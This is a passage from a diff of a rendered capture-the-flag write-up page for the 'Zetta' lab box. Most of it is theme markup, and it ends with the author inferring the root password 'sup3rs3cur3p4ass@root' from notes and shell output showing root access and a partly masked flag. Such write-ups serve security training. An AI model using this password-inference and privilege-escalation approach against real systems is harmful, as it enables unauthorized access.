 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-html" data-lang="html">  <span class="p">&lt;</span><span class="nt">todo</span> <span class="na">done</span><span class="o">=</span><span class="s">&#34;no&#34;</span> <span class="na">collapse</span><span class="o">=</span><span class="s">&#34;no&#34;</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Change shared password scheme from <span class="ni">&amp;lt;</span>secret<span class="ni">&amp;gt;</span>@userid to something more secure.<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
-                                <span class="p">&lt;</span><span class="nt">text</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">text</span><span class="p">&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">todo</span> <span class="na">done</span><span class="o">=</span><span class="s">&#34;no&#34;</span> <span class="na">collapse</span><span class="o">=</span><span class="s">&#34;no&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Change shared password scheme from <span class="ni">&amp;lt;</span>secret<span class="ni">&amp;gt;</span>@userid to something more secure.<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">                                <span class="p">&lt;</span><span class="nt">text</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">text</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>From above two notes: format of password of user posgres and todo list I made conclusion as password root should be <code>sup3rs3cur3p4ass@root</code>.
 Finally that worked and got the <code>root shell</code> and <code>root.txt</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -999,59 +932,57 @@ Finally that worked and got the <code>root shell</code> and <code>root.txt</code
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">postgres@zetta:~$ su root
-Password: 
-root@zetta:/var/lib/postgresql# <span class="nb">cd</span>
-root@zetta:~# whoami
-root
-root@zetta:~# id
-<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-root@zetta:~# cat root.txt
-b9407e837fb****************
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">postgres@zetta:~$ su root
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl">root@zetta:/var/lib/postgresql# <span class="nb">cd</span>
+</span></span><span class="line"><span class="cl">root@zetta:~# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">root@zetta:~# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@zetta:~# cat root.txt
+</span></span><span class="line"><span class="cl">b9407e837fb****************
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>This way I got the root of zetta box and learned alot from this box. So I would like to thank creator of this box <code>jkr</code> for such an awesome box.</p>
 <p>I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup.<br>
 Feedback are really appreciated !!<br>
 Tweet about this writeup if you like.</p>
-<p>You can follow and see my blog in my medium profile: <a href="https://medium.com/@gr4n173" target="_blank" rel="noopener noreffer">gr4n173</a>.</p></div><div class="post-footer" id="post-footer">
+<p>You can follow and see my blog in my medium profile: <a href="https://medium.com/@gr4n173" target="_blank" rel="noopener noreffer ">gr4n173</a>.</p></div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
                 <span>Updated on 2020-02-25</span>
-            </div>
-            <div class="post-info-license"></div>
-        </div>
+            </div></div>
         <div class="post-info-line">
             <div class="post-info-md"><span>
                             <a class="link-to-markdown" href="/zetta/index.md" target="_blank">Read Markdown</a>
                         </span></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.com/zetta/" data-title="Zetta" data-via="gr4n173" data-hashtags="linux,htb,ftp,postgres,rsync,ipv6,sqli,rce"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.com/zetta/" data-hashtag="linux"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.com/zetta/" data-title="Zetta"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.com/zetta/" data-title="Zetta"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.com/zetta/" data-title="Zetta"><i class="fab fa-weibo fa-fw"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.com/zetta/" data-title="Zetta" data-via="gr4n173" data-hashtags="linux,htb,ftp,postgres,rsync,ipv6,sqli,rce"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.com/zetta/" data-hashtag="linux"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.com/zetta/" data-title="Zetta"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.com/zetta/" data-title="Zetta"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.com/zetta/" data-title="Zetta"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
             </div>
         </div>
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/linux/">linux</a>,&nbsp;<a href="/tags/htb/">htb</a>,&nbsp;<a href="/tags/ftp/">ftp</a>,&nbsp;<a href="/tags/postgres/">postgres</a>,&nbsp;<a href="/tags/rsync/">rsync</a>,&nbsp;<a href="/tags/ipv6/">ipv6</a>,&nbsp;<a href="/tags/sqli/">sqli</a>,&nbsp;<a href="/tags/rce/">rce</a></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/linux/">linux</a>,&nbsp;<a href="/tags/htb/">htb</a>,&nbsp;<a href="/tags/ftp/">ftp</a>,&nbsp;<a href="/tags/postgres/">postgres</a>,&nbsp;<a href="/tags/rsync/">rsync</a>,&nbsp;<a href="/tags/ipv6/">ipv6</a>,&nbsp;<a href="/tags/sqli/">sqli</a>,&nbsp;<a href="/tags/rce/">rce</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
         </section>
     </div>
 
-    <div class="post-nav"><a href="/ldap/" class="prev" rel="prev" title="LDAP Enumeration"><i class="fas fa-angle-left fa-fw"></i>LDAP Enumeration</a>
-            <a href="/scavenger/" class="next" rel="next" title="Scavenger">Scavenger<i class="fas fa-angle-right fa-fw"></i></a></div>
+    <div class="post-nav"><a href="/moee-1/" class="prev" rel="prev" title="Moee-1"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Moee-1</a>
+            <a href="/scavenger/" class="next" rel="next" title="Scavenger">Scavenger<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">Lots of Love</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">xxxx</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">gr4n173</a></span></div>
+        <div class="footer-container"><div class="footer-line">Lots of Love</div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">xxxx</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">gr4n173</a></span></div>
         </div>
     </footer></div>
 
         <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
-                <i class="fas fa-arrow-up fa-fw"></i>
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
             </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
-                <i class="fas fa-comment fa-fw"></i>
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
             </a>
-        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"data":{"id-1":"gr4n173","id-2":"gr4n173"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"data":{"id-1":"gr4n173","id-2":"gr4n173"},"lightgallery":true,"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
 </html>
